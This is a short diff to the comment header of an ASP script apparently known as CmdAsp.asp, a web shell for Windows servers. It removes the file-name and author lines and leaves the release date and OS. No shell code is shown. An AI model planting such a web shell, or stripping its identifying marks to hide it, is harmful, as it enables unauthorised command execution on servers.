@@ -1,8 +1,6 @@
 <%@ Language=VBScript %>
 <%
   ' --------------------o0o--------------------
-  '  File:    CmdAsp.asp
-  '  Author:  Maceo <maceo @ dogmile.com>
   '  Release: 2000-12-01
   '  OS:      Windows 2000, 4.0 NT
   ' -------------------------------------------
